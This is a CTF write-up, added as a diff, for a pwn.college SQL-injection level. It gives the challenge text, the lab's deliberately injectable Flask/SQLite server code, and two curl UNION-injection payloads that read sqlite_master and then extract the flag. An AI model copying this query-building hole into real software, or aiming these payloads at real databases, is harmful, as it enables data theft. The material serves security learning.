@@ -1,0 +1,72 @@
+#SQLi 4
+#挑战简介
+So far, the database structure has been known to you (e.g., the name of the users table), allowing you to knowingly craft your queries. As a developer, 
+you might be tempted to prevent this by, say, randomizing your table names, so that an attacker can't specify them to query data that they are not supposed to. 
+Unfortunately, this is not the slam dunk that you might think it is.
+
+Databases are complex and much too clever for their own good. For example, almost all modern databases keep the database layout specification itself in a table. 
+Attackers can query this table to get the table names, field names, and whatever other information they might need!
+
+In this level, the developers have randomized the name of the (previously known as) users table. Find it, and find the flag!
+
+#cat /challenge/server
+#!/opt/pwn.college/python
+
+import tempfile
+import sqlite3
+import random
+import flask
+import os
+
+app = flask.Flask(__name__)
+
+class TemporaryDB:
+    def __init__(self):
+        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")
+
+    def execute(self, sql, parameters=()):
+        connection = sqlite3.connect(self.db_file.name)
+        connection.row_factory = sqlite3.Row
+        cursor = connection.cursor()
+        result = cursor.execute(sql, parameters)
+        connection.commit()
+        return result
+
+db = TemporaryDB()
+# https://www.sqlite.org/lang_createtable.html
+user_table = f"users_{random.randrange(2**32, 2**33)}"    //变数，表名随机
+db.execute(f"""CREATE TABLE {user_table} AS SELECT "admin" AS username, ? as password""", [open("/flag").read()])
+# https://www.sqlite.org/lang_insert.html
+db.execute(f"""INSERT INTO {user_table} SELECT "guest" as username, "password" as password""")
+
+@app.route("/", methods=["GET"])
+def challenge():
+    query = flask.request.args.get("query", "%")
+
+    try:
+        # https://www.sqlite.org/schematab.htmlF
+        # https://www.sqlite.org/lang_select.html
+        sql = f'SELECT username FROM {user_table} WHERE username LIKE "{query}"'
+        print(f"DEBUG: {query=}")
+        results = "\n".join(user["username"] for user in db.execute(sql).fetchall())
+    except sqlite3.Error as e:
+        results = f"SQL error: {e}"
+
+    return f"""
+        <html><body>Welcome to the user query service!
+        <form>Query:<input type=text name=query value='{query}'><input type=submit value=Submit></form>
+        <hr>
+        <b>Query:</b> <pre>{sql.replace(user_table, "REDACTED")}</pre><br>
+        <b>Results:</b><pre>{results}</pre>
+        </body></html>
+        """
+
+app.secret_key = os.urandom(8)
+port = 8080 if os.geteuid() else 80
+app.config['SERVER_NAME'] = f"challenge.localhost:{port}"
+app.run("challenge.localhost", port)
+
+#这题有点抽象，表名是随机的，但是表名也不是随机的，在一个挑战中，表名随即一次的名字不会再改变，所以我们可以先查询表名
+curl -v "http://challenge.localhost/?query=%22%20UNION%20SELECT%20name%20FROM%20sqlite_master%20WHERE%20type=%22table" //type = table的查询
+#得到后，便可以根据表名进行查询
+curl -v "http://challenge.localhost/?query=%22%20UNION%20SELECT%20password%20FROM%20users_6871942342%20WHERE%20username=%22admin"
